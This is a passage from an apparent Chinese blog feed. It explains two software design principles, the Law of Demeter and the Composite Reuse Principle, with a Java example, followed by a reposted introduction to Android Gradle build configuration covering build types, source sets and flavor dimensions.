strangers）。其含义是：如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。</p><p>迪米特法则中的“朋友”是指：当前对象本身、当前对象的成员对象、当前对象所创建的对象、当前对象的方法参数等，这些对象同当前对象存在关联、聚合或组合关系，可以直接访问这些对象的方法。</p><h4 id="迪米特法则的优点"><a href="#迪米特法则的优点" class="headerlink" title="迪米特法则的优点"></a>迪米特法则的优点</h4><p>迪米特法则要求限制软件实体之间通信的宽度和深度，正确使用迪米特法则将有以下两个优点。</p><ul><li>降低了类之间的耦合度，提高了模块的相对独立性。</li><li>由于亲合度降低，从而提高了类的可复用率和系统的扩展性。</li></ul><p>但是，过度使用迪米特法则会使系统产生大量的中介类，从而增加系统的复杂性，使模块之间的通信效率降低。所以，在釆用迪米特法则时需要反复权衡，确保高内聚和低耦合的同时，保证系统的结构清晰。</p><h4 id="迪米特法则的实现方法"><a href="#迪米特法则的实现方法" class="headerlink" title="迪米特法则的实现方法"></a>迪米特法则的实现方法</h4><blockquote><p>从迪米特法则的定义和特点可知，它强调以下两点：</p></blockquote><ul><li>从依赖者的角度来说，只依赖应该依赖的对象。</li><li>从被依赖者的角度说，只暴露应该暴露的方法。<blockquote><p>所以，在运用迪米特法则时要注意以下 6 点。</p></blockquote></li><li>在类的划分上，应该创建弱耦合的类。类与类之间的耦合越弱，就越有利于实现可复用的目标。</li><li>在类的结构设计上，尽量降低类成员的访问权限。</li><li>在类的设计上，优先考虑将一个类设置成不变类。</li><li>在对其他类的引用上，将引用其他对象的次数降到最低。</li><li>不暴露类的属性成员，而应该提供相应的访问器（set 和 get 方法）。</li><li>谨慎使用序列化（Serializable）功能。</li></ul><p>例1】明星与经纪人的关系实例。<br>分析：明星由于全身心投入艺术，所以许多日常事务由经纪人负责处理，如与粉丝的见面会，与媒体公司的业务洽淡等。这里的经纪人是明星的朋友，而粉丝和媒体公司是陌生人，所以适合使用迪米特法则，其类图如图 1 所示。</p><p>明星与经纪人的关系图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-bb58e07ab07defdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>程序代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">package principle;</span><br><span class="line">public class LoDtest</span><br><span class="line">&#123;</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">&#123;</span><br><span class="line">Agent agent&#x3D;new Agent();</span><br><span class="line">agent.setStar(new Star(&quot;林心如&quot;));</span><br><span class="line">agent.setFans(new Fans(&quot;粉丝韩丞&quot;));</span><br><span class="line">agent.setCompany(new Company(&quot;中国传媒有限公司&quot;));</span><br><span class="line">agent.meeting();</span><br><span class="line">agent.business();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;经纪人</span><br><span class="line">class Agent</span><br><span class="line">&#123;</span><br><span class="line">private Star myStar;</span><br><span class="line">private Fans myFans;</span><br><span class="line">private Company myCompany;</span><br><span class="line">public void setStar(Star myStar)</span><br><span class="line">&#123;</span><br><span class="line">this.myStar&#x3D;myStar;</span><br><span class="line">&#125;</span><br><span class="line">public void setFans(Fans myFans)</span><br><span class="line">&#123;</span><br><span class="line">this.myFans&#x3D;myFans;</span><br><span class="line">&#125;</span><br><span class="line">public void setCompany(Company myCompany)</span><br><span class="line">&#123;</span><br><span class="line">this.myCompany&#x3D;myCompany;</span><br><span class="line">&#125;</span><br><span class="line">public void meeting()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(myFans.getName()+&quot;与明星&quot;+myStar.getName()+&quot;见面了。&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void business()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(myCompany.getName()+&quot;与明星&quot;+myStar.getName()+&quot;洽淡业务。&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;明星</span><br><span class="line">class Star</span><br><span class="line">&#123;</span><br><span class="line">private String name;</span><br><span class="line">Star(String name)</span><br><span class="line">&#123;</span><br><span class="line">this.name&#x3D;name;</span><br><span class="line">&#125;</span><br><span class="line">public String getName()</span><br><span class="line">&#123;</span><br><span class="line">return name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;粉丝</span><br><span class="line">class Fans</span><br><span class="line">&#123;</span><br><span class="line">private String name;</span><br><span class="line">Fans(String name)</span><br><span class="line">&#123;</span><br><span class="line">this.name&#x3D;name;</span><br><span class="line">&#125;</span><br><span class="line">public String getName()</span><br><span class="line">&#123;</span><br><span class="line">return name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;媒体公司</span><br><span class="line">class Company</span><br><span class="line">&#123;</span><br><span class="line">private String name;</span><br><span class="line">Company(String name)</span><br><span class="line">&#123;</span><br><span class="line">this.name&#x3D;name;</span><br><span class="line">&#125;</span><br><span class="line">public String getName()</span><br><span class="line">&#123;</span><br><span class="line">return name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的运行结果如下：</p><blockquote><p>粉丝韩丞与明星林心如见面了。<br>中国传媒有限公司与明星林心如洽淡业务。</p></blockquote><h1 id="7-合成复用原则"><a href="#7-合成复用原则" class="headerlink" title="7 合成复用原则"></a>7 合成复用原则</h1><h4 id="合成复用原则的定义"><a href="#合成复用原则的定义" class="headerlink" title="合成复用原则的定义"></a>合成复用原则的定义</h4><p>合成复用原则（Composite Reuse Principle，CRP）又叫组合/聚合复用原则（Composition/Aggregate Reuse Principle，CARP）。它要求在软件复用时，要尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。</p><p>如果要使用继承关系，则必须严格遵循里氏替换原则。合成复用原则同里氏替换原则相辅相成的，两者都是开闭原则的具体实现规范。</p><h4 id="合成复用原则的重要性"><a href="#合成复用原则的重要性" class="headerlink" title="合成复用原则的重要性"></a>合成复用原则的重要性</h4><p>通常类的复用分为继承复用和合成复用两种，继承复用虽然有简单和易实现的优点，但它也存在以下缺点。</p><ol><li>继承复用破坏了类的封装性。因为继承会将父类的实现细节暴露给子类，父类对子类是透明的，所以这种复用又称为“白箱”复用。</li><li>子类与父类的耦合度高。父类的实现的任何改变都会导致子类的实现发生变化，这不利于类的扩展与维护。</li><li>它限制了复用的灵活性。从父类继承而来的实现是静态的，在编译时已经定义，所以在运行时不可能发生变化。</li></ol><p>采用组合或聚合复用时，可以将已有对象纳入新对象中，使之成为新对象的一部分，新对象可以调用已有对象的功能，它有以下优点。</p><ol><li>它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱”复用。</li><li>新旧类之间的耦合度低。这种复用所需的依赖较少，新对象存取成分对象的唯一方法是通过成分对象的接口。</li><li>复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。<h4 id="合成复用原则的实现方法"><a href="#合成复用原则的实现方法" class="headerlink" title="合成复用原则的实现方法"></a>合成复用原则的实现方法</h4><blockquote><p>合成复用原则是通过将已有的对象纳入新对象中，作为新对象的成员对象来实现的，新对象可以调用已有对象的功能，从而达到复用。</p></blockquote></li></ol><p>下面以汽车分类管理程序为例来介绍合成复用原则的应用。<br>例1】汽车分类管理程序。<br>分析：汽车按“动力源”划分可分为汽油汽车、电动汽车等；按“颜色”划分可分为白色汽车、黑色汽车和红色汽车等。如果同时考虑这两种分类，其组合就很多。图 1 所示是用继淨：关系实现的汽车分类的类图。<br>用继承关系实现的汽车分类的类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-a55e89e9e690cb64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>从图 1 可以看出用继承关系实现会产生很多子类，而且增加新的“动力源”或者增加新的“颜色”都要修改源代码，这违背了开闭原则，显然不可取。但如果改用组合关系实现就能很好地解决以上问题，其类图如图 2 所示。<br>用组合关系实现的汽车分类的类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d686028bf4aea067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>结合前几节的内容，我们一共介绍了 7 种设计原则，它们分别为<strong>开闭原则、里氏替换原则、依赖倒置原则、单一职责原则、接口隔离原则、迪米特法则和本节所介绍的合成复用原则。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Gradle 入门</title>
      <link href="/2022/04/10/Android-Gradle-%E5%85%A5%E9%97%A8/"/>
      <url>/2022/04/10/Android-Gradle-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/719ee08f7bbe">Android中Gradle入门详解</a></p><h2 id="1-什么是gradle"><a href="#1-什么是gradle" class="headerlink" title="1.什么是gradle"></a>1.什么是gradle</h2><p>Gradle 是新一代的自动化构建工具，它是一个独立的项目，跟 AS、Android 无关，官方网站：<a href="https://links.jianshu.com/go?to=https://gradle.org/">https://gradle.org/</a> , 类似 Ant、Maven这类构建工具都是基于 xml 来进行描述的，很臃肿，而 Gradle 采用的是一种叫做 Groovy 的语言，语法跟 Java 语法很像，但是是一种动态语言，而且在 Java 基础上做了不少改进，用起来更加简洁、灵活，而且 Gradle 完全兼容 Maven、Ivy，这点基本上宣布了 Maven、Ivy 可以被抛弃了，Gradle 的推出主要以 Java 应用为主，当然目前还支持 Android、C、C++。</p><h2 id="2-Gradle-与-Android-Studio-的关系"><a href="#2-Gradle-与-Android-Studio-的关系" class="headerlink" title="2. Gradle 与 Android Studio 的关系"></a>2. Gradle 与 Android Studio 的关系</h2><p>上面也提到，Gradle 跟 Android Studio 其实没有关系，但是 Gradle 官方还是很看重 Android 开发的，Google 在推出 AS 的时候选中了 Gradle 作为构建工具，为了支持 Gradle 能在 AS 上使用，Google 做了个 AS 的插件叫 Android Gradle Plugin ，所以我们能在 AS 上使用 Gradle 完全是因为这个插件的原因。在项目的根目录有个 build.gradle 文件，里面有这么一句代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classpath &#39;com.android.tools.build:gradle:2.1.2&#39;</span><br></pre></td></tr></table></figure><p>这个就是依赖 gradle 插件的代码，后面的版本号代表的是 android gradle plugin 的版本，而不是 Gradle 的版本，这个是 Google 定的，跟 Gradle 官方没关系。</p><h2 id="3-Gradle-Wrapper"><a href="#3-Gradle-Wrapper" class="headerlink" title="3. Gradle Wrapper"></a>3. Gradle Wrapper</h2><p>现在默认新建一个项目，然后点击 AS 上的运行，默认就会直接帮你安装 Gradle ，我们不需要额外的安装 Gradle 了，但是其实这个 Gradle 不是真正的 Gradle ，他叫 Gradle Wrapper ，意为 Gradle 的包装，什么意思呢？假设我们本地有多个项目，一个是比较老的项目，还用着 Gradle 1.0 的版本，一个是比较新的项目用了 Gradle 2.0 的版本，但是你两个项目肯定都想要同时运行的，如果你只装了 Gradle 1.0 的话那肯定不行，所以为了解决这个问题，Google 推出了 Gradle Wrapper 的概念，就是他在你每个项目都配置了一个指定版本的 Gradle ，你可以理解为每个 Android 项目本地都有一个小型的 Gradle ，通过这个每个项目你可以支持用不同的 Gradle 版本来构建项目。</p><h2 id="4-Gradle两个基本概念：项目和任务"><a href="#4-Gradle两个基本概念：项目和任务" class="headerlink" title="4. Gradle两个基本概念：项目和任务"></a>4. Gradle两个基本概念：项目和任务</h2><p>每个 build.gradle 构建脚本文件代表一个项目 project：<br>任务 task 定义在构建脚本里:</p><p>每次构建至少包括一个项目，每个项目里又至少包括一个任务。</p><p>在编译过程中， Gradle 会根据 build 相关文件，聚合所有的project和task，执行task 中的 action。因为 build.gradle文件中的task非常多，先执行哪个后执行那个需要一种逻辑来保证。这种逻辑就是依赖逻辑，几乎所有的Task 都需要依赖其他 task 来执行，没有被依赖的task 会首先被执行。所以到最后所有的 Task 会构成一个 有向无环图（DAG Directed Acyclic Graph）的数据结构。</p><h2 id="5-构建生命周期"><a href="#5-构建生命周期" class="headerlink" title="5. 构建生命周期"></a>5. 构建生命周期</h2><p>一个 Gradle 构建通常包括下面三个阶段：</p><ol><li>初始化<br>项目实例会在这时被创建，如果这个项目里有多个 module，或者依赖多个 library，并且它们都有对应的 build.gradle 文件，就会创建多个项目实例</li><li>配置<br>在这个阶段构建脚本被执行，并且为每个项目实例创建和配置任务</li><li>执行<br>在这个阶段 Gradle 将根据构建脚本的配置决定哪些任务会被执行</li></ol><h2 id="6-初识Gradle文件"><a href="#6-初识Gradle文件" class="headerlink" title="6. 初识Gradle文件"></a>6. 初识Gradle文件</h2><p>我们用 Android Studio 新创建一个项目时，会自动生成 3 个 Gradle 文件：</p><h4 id="setting-gradle"><a href="#setting-gradle" class="headerlink" title="setting.gradle"></a>setting.gradle</h4><p>setting.gradle 文件在 初始化过程中被执行，构建器通过 setting.gradle 文件中的内容了解哪些模块将被 build，下面的内容表明当前项目中除了 app 模块还有另外一个叫做 “shixinlibrary” 的依赖模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include ‘:app’, ‘:shixinlibrary’</span><br></pre></td></tr></table></figure><p>注意：单模块项目不一定需要有 setting 文件，但一旦有多个模块，必须要有 setting 文件，同时也要写明所有要构建的模块，否则 gradle 不会 build 不包括的模块。</p><h4 id="主目录下的-build-gradle"><a href="#主目录下的-build-gradle" class="headerlink" title="主目录下的 build.gradle"></a>主目录下的 build.gradle</h4><p>看 gradle 文件中的注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Top-level build file where you can configuration options common to all sub-projects&#x2F;modules.</span><br></pre></td></tr></table></figure><p>主目录下的 build.gradle 文件是最顶层的构建文件，这里配置所有模块通用的配置信息。</p><p>默认的顶层 build.gradle 文件中包括两个代码块 (buildscript 和 allprojects):</p><p><strong>buildscript</strong><br>从名字就可以看出来，buildscript 是所有项目的构建脚本配置，主要包括依赖的仓库和依赖的 gradle 版本。</p><p>下图中 repositories 代码块将 jcenter 配置为一个仓库，JCenter 是一个很有名的 Maven 仓库。确定了依赖的仓库后，我们就可以在 dependencies 代码块中添加依赖的、在 jcenter 仓库中的包了。</p><p>如果仓库有密码，也可以同时传入用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">repositories &#123;</span><br><span class="line">        jcenter()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123; </span><br><span class="line">            url &quot;https:&#x2F;&#x2F;dl.bintray.com&#x2F;thelasterstar&#x2F;maven&#x2F;&quot;</span><br><span class="line">            credentials &#123;</span><br><span class="line">                username &#39;user&#39;</span><br><span class="line">                password &#39;secretpassword&#39;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>dependencies 代码块用于配置构建过程中的依赖包，注意，这里是用于构建过程，因此你不能将你的应用模块中需要依赖的库添加到这里。</p><p>默认情况下唯一被用于构建过程中的依赖包是 Gradle for Android 的插件。我们还可以添加一些其他用于构建的插件，比如 retrolambda, apt, freeline 等等。</p><p><strong>allprojects</strong><br>allprojects 代码块用来声明将被用于所有模块的属性，注意是所有模块。常见的就是配置仓库地址（jcenter, 自定义 maven 仓库等），你还可以在 allprojects 中创建 tasks，这些 tasks 最终会运用到所有模块中，</p><blockquote><p>官方建议尽量少添加用于所有模块的属性，因为这意味着强耦合，一旦没有构建主项目，你的子模块很有可能因为缺少所有模块的属性导致构建失败。</p></blockquote><h4 id="模块下的-build-gradle"><a href="#模块下的-build-gradle" class="headerlink" title="模块下的 build.gradle"></a>模块下的 build.gradle</h4><p>模块下的 build.gradle 文件只应用于当前模块，你可以覆盖主目录下的 build.gradle 的内容。</p><p>上图中主要分三个模块：apply plugin , android, dependencies。<br><strong>apply plugin</strong><br>apply plugin 声明了接下来要用到哪些插件的内容，上图表明使用了 androd 插件，这里之所以能用 android 插件，是因为主目录中声明了 Gradle for Android 的依赖，这里才能使用。</p><p>因此当我们需要使用其他插件，比如 retrolambda 时，首先需要在主目录 build.gradle 文件中添加依赖，然后在模块 build.gradle 中声明使用 retrolambda 插件。</p><p>备注：默认的 android 插件是由 Google 官方维护的，为我们提供了构建、测试、打包 Android 应用的能力。除此之外我们还可以自定义插件。在逐渐加深对 Gradle 的了解后，我们将尝试自己写个 Gradle 插件。</p><p><strong>android</strong><br>在声明了 android 插件后，我们就可以使用 android 插件提供的内容进行构建配置。<br>android 构建配置中必须要有的是两个版本：</p><ul><li>compileSdkVersion : 编译应用的 Android API 版本</li><li>buildToolsVersion : 构建工具版本 (android studio3.0上已经不需要了)</li></ul><p>defaultConfig 代码块用于配置应用的默认属性，可以覆盖 AndroidManifest.xml 中的属性，比如：</p><ul><li>applicationId : 覆盖了 AndroidManifest 中的 package name</li><li>minSdkVersion : 覆盖了 AndroidManifest 中的属性，配置运行应用的最小 API</li><li>targetSdkVersion : 一样，用于通知系统当前应用已经被这个版本测试过，和之前的 compileSdkVersion 没有关系</li><li>versionCode : 一样，应用的版本号</li><li>versionName : 版本名称</li><li>defaultConfig 还可以添加签名，占位符等等，这里只列这些。</li><li>buildTypes 用来定义如何构建和打包不同类型的应用，常见的就是测试和生产。</li><li>android 中还可以配置其他信息，比如 签名、渠道等，你可以在 Project Structure 面板中直观的查看，添加，也可以使用代码添加</li></ul><p><strong>dependencies</strong><br>上图中可以看到 依赖配置 在 android 代码块的外边，事实上依赖配置是 Gradle 配置的基础功能，也就是说除了 Android，其他类型的项目（比如 JavaEE ）也可以这么用。</p><p>我们可以在依赖配置中，添加要使用的库，当然也可以添加本地的 jar 包。</p><h2 id="7-Android项目中的Gradle实践"><a href="#7-Android项目中的Gradle实践" class="headerlink" title="7.Android项目中的Gradle实践"></a>7.Android项目中的Gradle实践</h2><h4 id="版本的统一管理"><a href="#版本的统一管理" class="headerlink" title="版本的统一管理"></a>版本的统一管理</h4><p>当我们的工程中有许多module的时候，分开管理编译版本，minsdk将会是一件很麻烦的事，因为一个library的改动，可能会影响到其他module。这时我们就需要对所有的版本进行统一的管理：</p><p>我们可以把一些需要用的字段都放在project的build.gradle（注意是project的不是module的）中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ext &#123;   </span><br><span class="line"> compileSdk &#x3D; 21    </span><br><span class="line"> minSdk &#x3D; 11    </span><br><span class="line"> targetSdk &#x3D; 23    </span><br><span class="line"> support &#x3D; &quot;23.1.1&quot;   </span><br><span class="line"> buildTools &#x3D; &quot;21.0.1&quot;   </span><br><span class="line"> buildstyle &#x3D;&quot;debug&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，在module的build.gradle中可以进行读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">defaultConfig &#123;   </span><br><span class="line"> applicationId &quot;android.com.testgradle&quot;    </span><br><span class="line"> minSdkVersion rootProject.ext.minSdk    </span><br><span class="line"> targetSdkVersion rootProject.ext.targetSdk    </span><br><span class="line"> versionCode 1   </span><br><span class="line"> versionName &quot;1.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多版本打包（-Build-Variant）"><a href="#多版本打包（-Build-Variant）" class="headerlink" title="多版本打包（ Build Variant）"></a>多版本打包（ Build Variant）</h4><p><strong>BuildType</strong><br>默认情况下，Android plugin会自动的构建release和debug两个版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buildTypes &#123;</span><br><span class="line">    release &#123;</span><br><span class="line">        minifyEnabled true</span><br><span class="line">        proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    debug &#123;</span><br><span class="line">        minifyEnabled false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; release版本中设置了开启混淆，并且定义了混淆文件的位置</span><br></pre></td></tr></table></figure><p>Android plugin允许自定义这两个示例，并且可以创建其他的buildType，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">buildTypes &#123;</span><br><span class="line">    debug &#123;</span><br><span class="line">        minifyEnabled false</span><br><span class="line">        applicationIdSuffix &quot;.debug&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    custom.initWith(buildTypes.debug)</span><br><span class="line">    custom &#123;</span><br><span class="line">        applicationIdSuffix &quot;.custom&quot;</span><br><span class="line">        versionNameSuffix &quot;-customs&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置进行了一下设置：</p><ul><li>对默认的debug构建类型进行了修改，关闭了混淆配置，添加applicationId后缀</li><li>以debug为基础创建一个叫custom的构建类型（相当于继承了debug版本），在custom的构建类型中修改applicationId后缀，并添加了versionName的后缀。</li></ul><p><strong>Source sets</strong><br>gradle通过一个叫SourceSets的概念来寻找和关联要编译的源码文件，每当创建一个新的build type 的时候，gradle 默认都会创建一个新的source set。我们可以建立与main文件夹同级的文件夹，根据编译类型的不同我们可以选择对某些源码和资源文件直接进行替换。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0e1e156b4ff93fd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>对于每一个BuildType，Android plugin都会创建一个对应的sourceSet，默认位置为：src/BuildTypeName<br>所以新建BuildType的名字不能是main、androidTest和test这三个已经被用的名字</p><p>BuildType的代码/资源会以以下方式进行合并</p><ul><li>manifest会被合并到app的manifest文件中</li><li>res目录下的资源文件会替换main里的资源文件</li><li>java目录下的文件会被添加到main里的java目录中，所以不能和main里的类重名（含包名）</li></ul><p>除此之外，不同编译类型的项目，我们的依赖都可以不同，比如，如果我需要在staging和debug两个版本中使用不同的log框架，我们这样配置：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-5c8ed4c64853d9f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>Product flavors</strong><br>Product flavors 默认不引用，我们可以手动添加，同Build type一样，每一个Product flavors 版本也都有属于自己的Source sets，也可以差异化设置构建属性。</p><p>当同时设置了<strong>BuildType</strong>和<strong>Product flavors</strong>后，二者会组合构建，最多可以生成m×n个版本的apk包。对于二者SourceSets，重复的res文件覆盖原则buildType&gt;Product flavors</p><p>在一些情况下，一个应用可能需要基于多个标准来创建多个版本。<br>例如，有个 app 需要一个免费版本和一个付费的版本，并且需要在不同的 app 发布平台发布。这个 app 需要 2 个付费版和 2 个特定发布平台，因此就需要生成 4 个APK（不算 Build Types 生成的 Variant 版本）。</p><p>然而，这款 app 中，为 2 个发布平台构建的付费版本源代码都是相同，因此创建 4 个 flavor 来实现不是一个好办法。 如果使用两个 flavor 维度，两两组合，构建所有可能的 Variant 组合才是最好的。</p><p>这个功能的实现就是使用 Flavor Dimensions 。每一个 Dimensions 代表一个维度，并且 flavor 都被分配到一个指定的 Dimensions 中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">...</span><br><span class="line">flavorDimensions &#39;price&#39;, &#39;store&#39;</span><br><span class="line"></span><br><span class="line">productFlavors &#123;</span><br><span class="line">    google &#123;</span><br><span class="line">        dimension &#39;store&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    amazon &#123;</span><br><span class="line">        dimension &#39;store&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free &#123;</span><br><span class="line">        dimension &#39;price&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    paid &#123;</span><br><span class="line">        dimension &#39;price&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* 注：</span><br><span class="line">dimension参数在gradle2.0之后替换掉了flavorDimension参数，所以很多文章里依然使用的类似于如下写法：</span><br><span class="line">google &#123;</span><br><span class="line">        flavorDimension &#39;store&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">flavorDimension参数现已失效</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>andorid.flavorDimensions 数组按照先后排序定义了可能使用的 Dimensions 。每一个 Product Flavor 都被分配到一个 Dimensions 中。</p><p>上面的例子中将 Product Flavor 分为两组（即两个维度），分别为 price 维度 [free, paid] 和 store 维度 [google, amazon] ，再加上默认的 Build Type 有 [debug, release] ，这将会组合生成以下的 Build Variant：</p><ul><li>free-google-debug</li><li>free-google-release</li><li>free-amazon-debug</li><li>free-amazon-release</li><li>paid-google-debug</li><li>paid-google-release</li><li>paid-amazon-debug</li><li>paid-amazon-release</li></ul><p>每一个 Variant 版本的配置由几个 Product Flavor 对象决定：</p><ul><li>一个来自 price 组中的对象</li><li>一个来自 store 组中的对象</li></ul><p>android.flavorDimensions 中定义的 Dimensions 排序非常重要（Variant 命名和优先级等）。</p><p>flavorDimensions 中的排序决定了哪一个 flavor 覆盖哪一个，这对于资源来说非常重要，因为一个 flavor 中的值会替换定义在低优先级的 flavor 中的值。</p><p>flavorDimensions 使用最高的优先级定义，因此在上面例子中的优先级为：</p><blockquote><p>price &gt; store &gt; defaultConfig</p></blockquote><h4 id="android-studio-3-0的一些变化"><a href="#android-studio-3-0的一些变化" class="headerlink" title="android studio 3.0的一些变化"></a>android studio 3.0的一些变化</h4><p>不需要再指定buildToolsVersion了，会根据compileSdkVersion自动匹配合适的版本。</p><p>compile标签依然可用，但是已经过时，替代标签为api和implementation<br>api标签==compile<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2b1b6a7aaab1314e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在java文件中，选中你要转换的代码，然后在顶部选择Code——&gt;Convert Java File to Kotlin File进行转换就好了，转换之后，这就是一个Kotlin文件了。</p><p>Android Monitor分离为logcat和Android Profiler<br>支持java1.8，支持lamda表达式，并提示转换<br>新的文件资源管理器</p>]]></content>
      
